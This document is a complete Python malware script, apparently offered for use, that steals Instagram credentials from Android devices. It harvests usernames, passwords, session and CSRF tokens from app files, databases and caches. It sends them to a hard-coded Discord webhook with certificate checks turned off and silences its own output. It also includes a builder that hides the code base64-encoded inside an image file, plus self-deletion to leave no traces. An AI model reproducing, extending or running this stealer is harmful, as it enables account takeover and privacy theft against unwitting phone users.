#!/usr/bin/env python3
"""
MOBILE GHOST v19.0 - IMAGE-HIDDEN INSTAGRAM STEALER
✅ Hidden inside innocent image
✅ Opens like normal picture
✅ Silently steals Instagram credentials
✅ Sends everything to Discord
✅ Self-destructs after execution
"""

import os
import sys
import json
import time
import random
import base64
import hashlib
import sqlite3
import shutil
import subprocess
import tempfile
import re
import urllib.request
import ssl
import struct
from pathlib import Path
from datetime import datetime

# ========== YOUR DISCORD WEBHOOK ==========
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465267482129334425/cWANj6PH_GATXh4RnFu1t3mOPfOkBtGRoMuaqBBsh41YI34B30rKR5BzbqcOS1MQkPMR"

# ========== SUPPRESS ALL OUTPUT ==========
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')
import warnings
warnings.filterwarnings('ignore')

# ========== ANDROID DETECTION ==========
class AndroidDetector:
    @staticmethod
    def get_info():
        info = {
            'api_level': 33,
            'version': '13',
            'root': False,
            'manufacturer': 'unknown',
            'model': 'unknown'
        }
        try:
            result = subprocess.run(['getprop', 'ro.build.version.sdk'], 
                                   capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and result.stdout.strip():
                info['api_level'] = int(result.stdout.strip())
            
            result = subprocess.run(['getprop', 'ro.build.version.release'],
                                   capture_output=True, text=True, timeout=2)
            if result.returncode == 0 and result.stdout.strip():
                info['version'] = result.stdout.strip()
            
            info['root'] = os.getuid() == 0
            
            result = subprocess.run(['getprop', 'ro.product.manufacturer'],
                                   capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                info['manufacturer'] = result.stdout.strip()
            
            result = subprocess.run(['getprop', 'ro.product.model'],
                                   capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                info['model'] = result.stdout.strip()
        except:
            pass
        return info

# ========== INSTAGRAM PATHS BY ANDROID VERSION ==========
def get_instagram_paths(android_info):
    api = android_info['api_level']
    paths = {'shared_prefs': [], 'databases': [], 'no_root': [], 'external': []}
    
    # Root paths (try regardless, will fail if no root)
    paths['shared_prefs'] = [
        '/data/data/com.instagram.android/shared_prefs/com.instagram.android_preferences.xml',
        '/data/data/com.instagram.android/shared_prefs/login_info.xml'
    ]
    paths['databases'] = [
        '/data/data/com.instagram.android/databases/instagram.db',
        '/data/data/com.instagram.android/databases/shared_prefs.db'
    ]
    
    # No-root paths by Android version
    if api <= 28:  # Android 8-9
        paths['no_root'] = [
            '/sdcard/Android/data/com.instagram.android/cache/',
            '/sdcard/Android/data/com.instagram.android/files/'
        ]
    elif api <= 30:  # Android 10-11
        paths['no_root'] = [
            '/sdcard/Android/media/com.instagram.android/',
            '/storage/emulated/0/Android/media/com.instagram.android/'
        ]
    else:  # Android 12-14
        paths['no_root'] = [
            '/sdcard/Android/media/com.instagram.android/',
            '/storage/emulated/0/Android/media/com.instagram.android/'
        ]
    
    # External paths
    paths['external'] = [
        '/sdcard/Instagram/',
        '/sdcard/DCIM/Instagram/',
        '/sdcard/Pictures/Instagram/'
    ]
    
    # Filter existing paths
    for key in paths:
        paths[key] = [p for p in paths[key] if os.path.exists(p)]
    
    return paths

# ========== SHARED PREFERENCES PARSER ==========
def parse_shared_prefs(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        creds = {}
        
        # Username
        username = re.search(r'<string name="username">([^<]+)</string>', content)
        if username:
            creds['username'] = username.group(1)
        
        # Password
        password = re.search(r'<string name="password">([^<]+)</string>', content)
        if password:
            creds['password'] = password.group(1)
        
        # Session token
        token = re.search(r'<string name="sessionid">([^<]+)</string>', content)
        if token:
            creds['session_token'] = token.group(1)
        
        # CSRF token
        csrf = re.search(r'<string name="csrftoken">([^<]+)</string>', content)
        if csrf:
            creds['csrf_token'] = csrf.group(1)
        
        # User ID
        user_id = re.search(r'<string name="user_id">([^<]+)</string>', content)
        if user_id:
            creds['user_id'] = user_id.group(1)
        
        return creds if creds else None
    except:
        return None

# ========== DATABASE EXTRACTOR ==========
def extract_from_database(db_path):
    credentials = []
    temp_db = None
    
    try:
        temp_db = tempfile.mktemp(suffix='.db')
        shutil.copy2(db_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Get all tables
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = cursor.fetchall()
        
        for table in tables:
            table_name = table[0]
            if table_name.startswith('sqlite_'):
                continue
            
            try:
                # Get columns
                cursor.execute(f"PRAGMA table_info({table_name})")
                columns = [col[1] for col in cursor.fetchall()]
                
                # Check if this table might have credentials
                has_creds = False
                for col in columns:
                    col_lower = col.lower()
                    if any(x in col_lower for x in ['user', 'name', 'pass', 'token', 'session']):
                        has_creds = True
                        break
                
                if not has_creds:
                    continue
                
                # Get data
                cursor.execute(f"SELECT * FROM {table_name} LIMIT 20")
                rows = cursor.fetchall()
                
                for row in rows:
                    cred = {}
                    for i, col in enumerate(columns):
                        if i < len(row) and row[i]:
                            val = str(row[i])
                            col_lower = col.lower()
                            
                            if 'user' in col_lower or 'name' in col_lower:
                                if len(val) > 3 and len(val) < 50:
                                    cred['username'] = val
                            elif 'pass' in col_lower or 'pwd' in col_lower:
                                if len(val) > 3:
                                    cred['password'] = val
                            elif 'token' in col_lower or 'session' in col_lower:
                                if len(val) > 10:
                                    cred['session_token'] = val[:100]
                            elif 'email' in col_lower:
                                if '@' in val:
                                    cred['email'] = val
                    
                    if cred:
                        cred['table'] = table_name
                        credentials.append(cred)
                        
            except:
                continue
        
        conn.close()
        
    except:
        pass
    
    finally:
        if temp_db and os.path.exists(temp_db):
            try:
                os.unlink(temp_db)
            except:
                pass
    
    return credentials

# ========== CACHE SCANNER ==========
def scan_cache(directory):
    credentials = []
    
    if not os.path.exists(directory):
        return credentials
    
    try:
        for root, dirs, files in os.walk(directory):
            if root.count(os.sep) > 5:
                continue
            
            for file in files:
                if not file.endswith(('.tmp', '.dat', '.cache', '.json', '.txt')):
                    continue
                
                try:
                    file_path = os.path.join(root, file)
                    
                    if os.path.getsize(file_path) > 500 * 1024:
                        continue
                    
                    with open(file_path, 'r', errors='ignore') as f:
                        content = f.read()
                    
                    cred = {}
                    
                    # Email
                    email = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', content)
                    if email:
                        cred['email'] = email.group(1)
                    
                    # Username
                    username = re.search(r'username["\']?\s*[:=]\s*["\']([^"\']+)', content, re.IGNORECASE)
                    if username:
                        cred['username'] = username.group(1)
                    
                    # Session token
                    token = re.search(r'session[_-]?id["\']?\s*[:=]\s*["\']([a-fA-F0-9]{32,})', content, re.IGNORECASE)
                    if token:
                        cred['session_token'] = token.group(1)
                    
                    if cred:
                        cred['source'] = file_path
                        credentials.append(cred)
                        
                except:
                    continue
                    
    except:
        pass
    
    return credentials

# ========== STEAL CREDENTIALS ==========
def steal_instagram_credentials():
    android = AndroidDetector.get_info()
    paths = get_instagram_paths(android)
    
    all_credentials = []
    
    # Method 1: Shared Preferences
    for prefs_path in paths['shared_prefs']:
        if os.path.exists(prefs_path):
            creds = parse_shared_prefs(prefs_path)
            if creds:
                creds['source'] = prefs_path
                creds['method'] = 'shared_prefs'
                all_credentials.append(creds)
    
    # Method 2: Databases
    for db_path in paths['databases']:
        if os.path.exists(db_path):
            db_creds = extract_from_database(db_path)
            for cred in db_creds:
                cred['source'] = db_path
                cred['method'] = 'database'
                all_credentials.append(cred)
    
    # Method 3: Cache
    for cache_path in paths['no_root']:
        if os.path.exists(cache_path):
            cache_creds = scan_cache(cache_path)
            for cred in cache_creds:
                cred['method'] = 'cache'
                all_credentials.append(cred)
    
    # Method 4: External storage
    for ext_path in paths['external']:
        if os.path.exists(ext_path):
            ext_creds = scan_cache(ext_path)
            for cred in ext_creds:
                cred['method'] = 'external'
                all_credentials.append(cred)
    
    # Remove duplicates by username/email
    unique = {}
    for cred in all_credentials:
        if 'username' in cred and cred['username'] not in unique:
            unique[cred['username']] = cred
        elif 'email' in cred and cred['email'] not in unique:
            unique[cred['email']] = cred
    
    return {
        'android': android,
        'credentials': list(unique.values()),
        'total': len(unique)
    }

# ========== SEND TO DISCORD ==========
def send_to_discord(data):
    if data['total'] == 0:
        return
    
    # Format credentials
    description = ""
    for i, cred in enumerate(data['credentials'][:10]):  # Show first 10
        description += f"**Account {i+1}**\n"
        if 'username' in cred:
            description += f"👤 Username: `{cred['username']}`\n"
        if 'email' in cred:
            description += f"📧 Email: `{cred['email']}`\n"
        if 'password' in cred:
            description += f"🔑 Password: `{cred['password']}`\n"
        if 'session_token' in cred:
            token = cred['session_token'][:50] + "..." if len(cred['session_token']) > 50 else cred['session_token']
            description += f"🎫 Session: `{token}`\n"
        if 'csrf_token' in cred:
            description += f"🛡️ CSRF: `{cred['csrf_token'][:30]}...`\n"
        if 'user_id' in cred:
            description += f"🆔 User ID: `{cred['user_id']}`\n"
        description += f"📍 Method: `{cred.get('method', 'unknown')}`\n\n"
    
    payload = {
        "username": "📸 Instagram Ghost",
        "embeds": [{
            "title": f"🎯 INSTAGRAM CREDENTIALS CAPTURED",
            "description": description[:2000],
            "color": 0xE1306C,
            "fields": [
                {"name": "Android", "value": f"`{data['android']['version']}`", "inline": True},
                {"name": "Device", "value": f"`{data['android']['manufacturer']} {data['android']['model']}`".strip(), "inline": True},
                {"name": "Root", "value": f"`{data['android']['root']}`", "inline": True},
                {"name": "Total Accounts", "value": f"`{data['total']}`", "inline": True}
            ],
            "footer": {"text": f"Ghost v19.0 | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        }]
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13)',
        'Content-Type': 'application/json'
    }
    
    try:
        req = urllib.request.Request(
            DISCORD_WEBHOOK,
            data=json.dumps(payload).encode('utf-8'),
            headers=headers,
            method='POST'
        )
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
            return resp.status in [200, 204]
    except:
        return False

# ========== IMAGE HANDLER ==========
class ImageHandler:
    """Handle image steganography"""
    
    @staticmethod
    def hide_payload(image_path, payload_code, output_path=None):
        """Hide payload in image"""
        with open(image_path, 'rb') as f:
            image_data = bytearray(f.read())
        
        # Encode payload
        payload_bytes = payload_code.encode('utf-8')
        payload_b64 = base64.b64encode(payload_bytes)
        
        # Add marker
        marker = b'GHOSTv19'
        hidden = marker + payload_b64 + marker
        
        # Find insertion point (after JPEG header)
        if image_data[:2] == b'\xFF\xD8':  # JPEG
            # Insert after SOI marker
            pos = 2
        else:
            # PNG or other format - append at end
            pos = len(image_data)
        
        # Insert payload
        result = image_data[:pos] + hidden + image_data[pos:]
        
        # Save
        if not output_path:
            name = Path(image_path).stem
            ext = Path(image_path).suffix
            output_path = f"{name}_ghost{ext}"
        
        with open(output_path, 'wb') as f:
            f.write(result)
        
        return output_path
    
    @staticmethod
    def extract_and_run(image_path):
        """Extract payload from image and run"""
        try:
            with open(image_path, 'rb') as f:
                data = f.read()
            
            # Find marker
            marker = b'GHOSTv19'
            if marker not in data:
                return False
            
            # Extract between markers
            parts = data.split(marker)
            if len(parts) < 3:
                return False
            
            payload_b64 = parts[1]
            
            # Decode
            payload_bytes = base64.b64decode(payload_b64)
            payload_code = payload_bytes.decode('utf-8')
            
            # Execute in memory
            exec_globals = {
                '__name__': '__main__',
                'os': os,
                'sys': sys,
                'json': json,
                'base64': base64,
                'hashlib': hashlib,
                'time': time,
                'datetime': datetime,
                'subprocess': subprocess,
                'sqlite3': sqlite3,
                'shutil': shutil,
                'tempfile': tempfile,
                're': re,
                'urllib': urllib,
                'ssl': ssl
            }
            
            # Add Discord webhook to globals
            exec_globals['DISCORD_WEBHOOK'] = DISCORD_WEBHOOK
            
            exec(payload_code, exec_globals)
            
            # Self-destruct - delete the image after execution
            try:
                os.unlink(image_path)
            except:
                pass
            
            return True
            
        except:
            return False

# ========== MAIN EXECUTION ==========
def main():
    """Main entry point"""
    
    if len(sys.argv) > 1 and sys.argv[1] == '--build' and len(sys.argv) > 2:
        # Build mode - create infected image
        print("[*] Building infected image...")
        
        # Read our own code
        with open(__file__, 'r') as f:
            code = f.read()
        
        # Remove the build section to avoid recursion
        code = code.replace('if len(sys.argv) > 1 and sys.argv[1] == \'--build\'', 'if False')
        
        # Hide in image
        output = ImageHandler.hide_payload(sys.argv[2], code)
        
        print(f"[+] Success! Infected image created: {output}")
        print(f"[+] Size: {os.path.getsize(output)} bytes")
        print(f"[+] When opened on Android, it will:")
        print(f"    • Silently steal Instagram credentials")
        print(f"    • Send to Discord webhook")
        print(f"    • Self-destruct (delete itself)")
        print(f"    • Leave no traces")
        
    else:
        # Execution mode - run silently
        # Check if we're being run from an image
        if len(sys.argv) > 0 and os.path.exists(sys.argv[0]):
            if sys.argv[0].lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                # We are an image - extract and run
                ImageHandler.extract_and_run(sys.argv[0])
            else:
                # We are a Python script - run normally
                # Steal credentials
                stolen = steal_instagram_credentials()
                
                # Send to Discord
                if stolen['total'] > 0:
                    send_to_discord(stolen)
                
                # Self-destruct if we're in a temp location
                if '/tmp/' in sys.argv[0] or '/data/local/tmp/' in sys.argv[0]:
                    try:
                        os.unlink(sys.argv[0])
                    except:
                        pass

if __name__ == "__main__":
    main()